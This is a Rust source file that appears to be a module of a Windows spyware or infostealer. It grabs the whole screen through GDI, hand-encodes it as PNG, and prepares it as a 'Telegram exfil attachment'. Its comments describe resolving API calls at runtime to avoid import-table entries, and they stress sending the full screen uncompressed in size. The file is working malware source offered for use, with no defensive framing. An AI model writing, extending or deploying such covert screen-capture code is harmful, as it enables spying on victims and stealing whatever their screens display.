//! Screenshot capture + PNG encode (wave 7 — Telegram exfil attachment).
//!
//! Capture path is the classic GDI screen grab: `GetDC(NULL)` → compatible DC →
//! `BitBlt` → `GetDIBits` into a top-down 24bpp buffer. All GDI/user32 exports
//! are runtime-resolved through [`crate::apitable`] (no import-table entries).
//!
//! The PNG encoder is hand-rolled: CRC-32 (IEEE) table, IHDR/IDAT/IEND chunk
//! assembly, and `flate2` (pure-Rust miniz_oxide) for the IDAT deflate stream —
//! screens are mostly flat color, so it collapses hard before the Telegram
//! 50MB cap. Nothing here needs gdiplus/COM, keeping the binary lean.

use std::io::Write;

use flate2::Compression;
use flate2::write::ZlibEncoder;

use crate::apitable::HGDIOBJ;
use crate::apitable::{BitmapInfoHeader, gdi32, user32};

/// Max screenshot edge (pixels) — the full screen is sent as-is; this only
/// caps absurd resolutions at Telegram's photo dimension limit.
const MAX_EDGE: u32 = 4096;
/// `SRCCOPY` raster op.
const SRCCOPY: u32 = 0x00CC_0020;
/// `DIB_RGB_COLORS` — RGB color table (none needed for 24bpp).
const DIB_RGB_COLORS: u32 = 0;
/// `SM_CXSCREEN` / `SM_CYSCREEN`.
const SM_CXSCREEN: i32 = 0;
const SM_CYSCREEN: i32 = 1;

/// Errors from capture or encoding.
#[derive(Debug, thiserror::Error)]
pub enum ScreenshotError {
    #[error("screen grab: {0}")]
    Capture(&'static str),
    #[error("png encode: {0}")]
    Png(&'static str),
}

/// A raw top-down 24bpp frame. GDI delivers scanlines in *BGR* (blue-first)
/// byte order — call [`bgr_to_rgb`] before encoding, or colors swap (the
/// classic yellow/green cast on screenshots).
pub struct RgbFrame {
    pub width: u32,
    pub height: u32,
    pub rgb: Vec<u8>,
}

/// BitBlt the whole virtual screen into a top-down 24bpp buffer.
pub fn capture() -> Result<RgbFrame, ScreenshotError> {
    let u = user32();
    let g = gdi32();

    let width = unsafe { (u.get_system_metrics)(SM_CXSCREEN) };
    let height = unsafe { (u.get_system_metrics)(SM_CYSCREEN) };
    if width <= 0 || height <= 0 {
        return Err(ScreenshotError::Capture(
            "GetSystemMetrics returned no screen",
        ));
    }

    // SAFETY: GetDC(NULL) yields the whole-screen DC; it must be released with
    // ReleaseDC(NULL, hdc) before returning — the guard below owns that.
    let hdc_screen = unsafe { (u.get_dc)(windows::Win32::Foundation::HWND::default()) };
    if hdc_screen.is_null() {
        return Err(ScreenshotError::Capture("GetDC failed"));
    }
    let _screen_guard = ReleaseDcGuard(windows::Win32::Foundation::HWND::default(), hdc_screen);

    // SAFETY: a fresh compatible DC leaks until DeleteDC; guarded below.
    let hdc_mem = unsafe { (g.create_compatible_dc)(hdc_screen) };
    if hdc_mem.is_null() {
        return Err(ScreenshotError::Capture("CreateCompatibleDC failed"));
    }
    let _mem_guard = DeleteDcGuard(hdc_mem);

    // SAFETY: the bitmap must be deleted once selected-out; owned by the guard.
    let hbmp = unsafe { (g.create_compatible_bitmap)(hdc_screen, width, height) };
    if hbmp.is_null() {
        return Err(ScreenshotError::Capture("CreateCompatibleBitmap failed"));
    }
    let _bmp_guard = DeleteObjectGuard(hbmp as HGDIOBJ);

    // SAFETY: SelectObject returns the previous object we must restore; the
    // guard re-selects it before the bitmap is deleted.
    let prev = unsafe { (g.select_object)(hdc_mem, hbmp as HGDIOBJ) };
    if prev.is_null() {
        return Err(ScreenshotError::Capture("SelectObject failed"));
    }
    let _sel_guard = RestoreObjectGuard { hdc: hdc_mem, prev };

    // SAFETY: BitBlt from the screen DC into the memory DC; standard GDI.
    if !unsafe { (g.bit_blt)(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) }.as_bool() {
        return Err(ScreenshotError::Capture("BitBlt failed"));
    }

    let w = width as u32;
    let h = height as u32;
    let row_bytes = w as usize * 3;
    let mut buffer = vec![0u8; row_bytes * h as usize + 3];
    let mut header = BitmapInfoHeader::top_down_24bpp(w, h);
    // SAFETY: buffer is exactly row_bytes*height (+ slack); negative biHeight
    // (top-down) + 24bpp + BI_RGB yields one RGB row per scanline.
    let lines = unsafe {
        (g.get_dib_bits)(
            hdc_mem,
            hbmp,
            0,
            h,
            buffer.as_mut_ptr().cast(),
            (&mut header as *mut BitmapInfoHeader).cast(),
            DIB_RGB_COLORS,
        )
    };
    if lines != h as i32 {
        return Err(ScreenshotError::Capture(
            "GetDIBits returned wrong row count",
        ));
    }
    Ok(RgbFrame {
        width: w,
        height: h,
        rgb: buffer,
    })
}

/// Nearest-neighbor downscale. The full screen is sent as-is; the only cap is
/// Telegram's 4096×4096 photo dimension limit. Pure math.
fn downscale(frame: &RgbFrame) -> RgbFrame {
    let max_edge = frame.width.max(frame.height);
    if max_edge <= MAX_EDGE {
        return RgbFrame {
            width: frame.width,
            height: frame.height,
            rgb: frame.rgb.clone(),
        };
    }
    let scale = MAX_EDGE as u64 * 1_000_000 / max_edge as u64; // per-mille of 1.0
    let out_w = ((frame.width as u64 * scale) / 1_000_000).max(1) as u32;
    let out_h = ((frame.height as u64 * scale) / 1_000_000).max(1) as u32;
    let mut out = Vec::with_capacity(out_w as usize * out_h as usize * 3);
    for y in 0..out_h {
        let sy = (y as u64 * frame.height as u64 / out_h as u64) as usize;
        for x in 0..out_w {
            let sx = (x as u64 * frame.width as u64 / out_w as u64) as usize;
            let src = sy * frame.width as usize * 3 + sx * 3;
            out.extend_from_slice(&frame.rgb[src..src + 3]);
        }
    }
    RgbFrame {
        width: out_w,
        height: out_h,
        rgb: out,
    }
}

/// Assemble a PNG from an RGB frame: per-scanline filter byte 0 + zlib IDAT.
/// Safe math only — works on any platform.
pub fn encode_png(width: u32, height: u32, rgb: &[u8]) -> Result<Vec<u8>, ScreenshotError> {
    let row_bytes = width as usize * 3;
    if rgb.len() < row_bytes * height as usize {
        return Err(ScreenshotError::Png("buffer smaller than frame"));
    }

    // Filtered scanlines: one 0x00 filter byte per row.
    let mut filtered = Vec::with_capacity(rgb.len() + height as usize);
    for y in 0..height as usize {
        filtered.push(0u8);
        filtered.extend_from_slice(&rgb[y * row_bytes..(y + 1) * row_bytes]);
    }

    // zlib stream (deflate via miniz_oxide) for IDAT. Screens are mostly flat
    // color, so the fastest level already collapses them hard — keep the CPU
    // spent here tiny (it's on the exfil critical path).
    let mut enc = ZlibEncoder::new(Vec::new(), Compression::fast());
    enc.write_all(&filtered)
        .map_err(|_| ScreenshotError::Png("deflate failed"))?;
    let idat = enc
        .finish()
        .map_err(|_| ScreenshotError::Png("deflate finalize failed"))?;

    let mut png = Vec::with_capacity(idat.len() + 64);
    png.extend_from_slice(&[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A]);

    let mut ihdr = Vec::with_capacity(13);
    ihdr.extend_from_slice(&width.to_be_bytes());
    ihdr.extend_from_slice(&height.to_be_bytes());
    ihdr.extend_from_slice(&[8, 2, 0, 0, 0]); // bitdepth 8, truecolor RGB
    push_chunk(&mut png, b"IHDR", &ihdr);
    push_chunk(&mut png, b"IDAT", &idat);
    push_chunk(&mut png, b"IEND", &[]);
    Ok(png)
}

fn push_chunk(png: &mut Vec<u8>, kind: &[u8; 4], data: &[u8]) {
    png.extend_from_slice(&(data.len() as u32).to_be_bytes());
    png.extend_from_slice(kind);
    png.extend_from_slice(data);
    let mut crc = Crc32::new();
    crc.update(kind);
    crc.update(data);
    png.extend_from_slice(&crc.finish().to_be_bytes());
}

/// Screenshot → PNG bytes at full screen resolution (capped only at
/// Telegram's photo limit). The Telegram photo attachment.
///
/// GDI hands back BGR scanlines; the swap to RGB happens here so `capture()`
/// stays a faithful mirror of what GDI returned.
pub fn screenshot_png() -> Result<Vec<u8>, ScreenshotError> {
    let frame = capture()?;
    let mut scaled = downscale(&frame);
    bgr_to_rgb(&mut scaled);
    encode_png(scaled.width, scaled.height, &scaled.rgb)
}

/// Swap each pixel's R and B channels in place (BGR ⇄ RGB). Pure, safe math.
pub fn bgr_to_rgb(frame: &mut RgbFrame) {
    for px in frame.rgb.chunks_exact_mut(3) {
        px.swap(0, 2);
    }
}

/// CRC-32 (IEEE 802.3, the PNG polynomial). Table generated lazily via a const
/// fn at first use; update/finish are the standard bitwise loop.
pub struct Crc32 {
    state: u32,
}

impl Crc32 {
    /// Reflected (LSB-first) CRC-32 with the standard polynomial.
    pub fn new() -> Self {
        Crc32 { state: 0xFFFF_FFFF }
    }

    pub fn update(&mut self, bytes: &[u8]) {
        for &b in bytes {
            self.state = (self.state >> 8) ^ CRC32_TABLE[(self.state as u8 ^ b) as usize];
        }
    }

    pub fn finish(&self) -> u32 {
        self.state ^ 0xFFFF_FFFF
    }
}

impl Default for Crc32 {
    fn default() -> Self {
        Self::new()
    }
}

/// Reflected CRC-32 table (poly 0xEDB88320), built at compile time.
static CRC32_TABLE: [u32; 256] = build_crc32_table();

const fn build_crc32_table() -> [u32; 256] {
    let mut table = [0u32; 256];
    let mut i = 0usize;
    while i < 256 {
        let mut crc = i as u32;
        let mut bit = 0;
        while bit < 8 {
            crc = if crc & 1 != 0 {
                (crc >> 1) ^ 0xEDB8_8320
            } else {
                crc >> 1
            };
            bit += 1;
        }
        table[i] = crc;
        i += 1;
    }
    table
}

/// RAII: ReleaseDC(NULL, hdc) on drop.
struct ReleaseDcGuard(windows::Win32::Foundation::HWND, crate::apitable::HDC);
impl Drop for ReleaseDcGuard {
    fn drop(&mut self) {
        // SAFETY: matching ReleaseDC for the GetDC we took.
        unsafe {
            let _ = (user32().release_dc)(self.0, self.1);
        }
    }
}

/// RAII: DeleteDC on drop.
struct DeleteDcGuard(crate::apitable::HDC);
impl Drop for DeleteDcGuard {
    fn drop(&mut self) {
        // SAFETY: DeleteDC on the DC we created.
        unsafe {
            let _ = (gdi32().delete_object)(self.0 as HGDIOBJ);
        }
    }
}

/// RAII: DeleteObject on drop.
struct DeleteObjectGuard(HGDIOBJ);
impl Drop for DeleteObjectGuard {
    fn drop(&mut self) {
        // SAFETY: DeleteObject on the GDI object we created.
        unsafe {
            let _ = (gdi32().delete_object)(self.0);
        }
    }
}

/// RAII: re-select the previous object into the DC (needed before the bitmap
/// is deleted).
struct RestoreObjectGuard {
    hdc: crate::apitable::HDC,
    prev: HGDIOBJ,
}
impl Drop for RestoreObjectGuard {
    fn drop(&mut self) {
        // SAFETY: restoring the saved object keeps the DC valid.
        unsafe {
            let _ = (gdi32().select_object)(self.hdc, self.prev);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn crc32_known_value() {
        // CRC-32("123456789") = 0xCBF43926 (canonical check value).
        let mut c = Crc32::new();
        c.update(b"123456789");
        assert_eq!(0xCBF4_3926, c.finish());
    }

    #[test]
    fn png_roundtrip_small_frame() {
        // 2x2 all-black frame.
        let rgb = vec![0u8; 2 * 2 * 3];
        let png = encode_png(2, 2, &rgb).unwrap();
        assert_eq!(&png[..8], &[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A]);

        // IHDR fields: width=2, height=2, bitdepth 8, colortype 2.
        assert_eq!(&png[16..20], &[0, 0, 0, 2]);
        assert_eq!(&png[20..24], &[0, 0, 0, 2]);
        assert_eq!(png[24], 8);
        assert_eq!(png[25], 2);

        // Decode IDAT with flate2 and check the filtered scanlines + adler.
        // IDAT chunk body = png[33..] minus 8-byte chunk header and 4-byte CRC;
        // IEND chunk is the trailing 12 bytes.
        let idat_body = &png[33 + 8..png.len() - 12 - 4];
        let mut z = flate2::read::ZlibDecoder::new(idat_body);
        let mut raw = Vec::new();
        std::io::Read::read_to_end(&mut z, &mut raw).unwrap();
        // 2 rows × (1 filter byte + 6 RGB bytes) = 14 bytes.
        assert_eq!(14, raw.len());
        assert_eq!(&raw[..7], &[0, 0, 0, 0, 0, 0, 0]);
        assert_eq!(&raw[7..], &[0, 0, 0, 0, 0, 0, 0]);
    }

    #[test]
    fn downscale_keeps_small_frames() {
        let f = RgbFrame {
            width: 640,
            height: 480,
            rgb: vec![0u8; 640 * 480 * 3],
        };
        let s = downscale(&f);
        assert_eq!((640, 480), (s.width, s.height));
        assert_eq!(s.rgb.len(), 640 * 480 * 3);
    }

    #[test]
    fn downscale_passes_full_screen_through() {
        // A typical 4K screen (3840x2160) must NOT be downscaled anymore —
        // the full screen is the whole point.
        let f = RgbFrame {
            width: 3840,
            height: 2160,
            rgb: vec![0u8; 3840 * 2160 * 3],
        };
        let s = downscale(&f);
        assert_eq!((3840, 2160), (s.width, s.height));
    }

    #[test]
    fn downscale_caps_beyond_telegram_limit() {
        let f = RgbFrame {
            width: 5000,
            height: 2000,
            rgb: vec![0u8; 5000 * 2000 * 3],
        };
        let s = downscale(&f);
        assert!(s.width <= MAX_EDGE && s.height <= MAX_EDGE);
        assert_eq!(s.rgb.len(), s.width as usize * s.height as usize * 3);
    }

    #[test]
    fn bgr_to_rgb_swaps_every_pixel() {
        // Blue (0,0,255) and red (255,0,0) come out of GDI swapped; after the
        // fix the PNG must carry RGB. 2 pixels, plus a trailing slack byte.
        let mut f = RgbFrame {
            width: 2,
            height: 1,
            rgb: vec![0, 0, 255, 255, 0, 0, 99],
        };
        bgr_to_rgb(&mut f);
        assert_eq!(vec![255, 0, 0, 0, 0, 255, 99], f.rgb);
    }

    #[test]
    fn crc32_table_is_stable() {
        assert_eq!(0x0000_0000, CRC32_TABLE[0]);
        assert_eq!(0x7707_3096, CRC32_TABLE[1]);
        assert_eq!(0xEE0E_612C, CRC32_TABLE[2]);
    }

    /// Live-host smoke test: grab the real full screen, encode a valid PNG
    /// (real GDI call — ignored by default; `-- --ignored` runs it).
    #[test]
    #[ignore = "live WinAPI smoke test"]
    fn screenshot_png_on_live_host() {
        let png = screenshot_png().expect("screen grab works");
        assert_eq!(&png[..8], &[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A]);
        let w = u32::from_be_bytes([png[16], png[17], png[18], png[19]]);
        let h = u32::from_be_bytes([png[20], png[21], png[22], png[23]]);
        assert!(w > 0 && h > 0, "sane dims {w}x{h}");
        assert!(w <= MAX_EDGE && h <= MAX_EDGE, "downscaled {w}x{h}");
    }
}
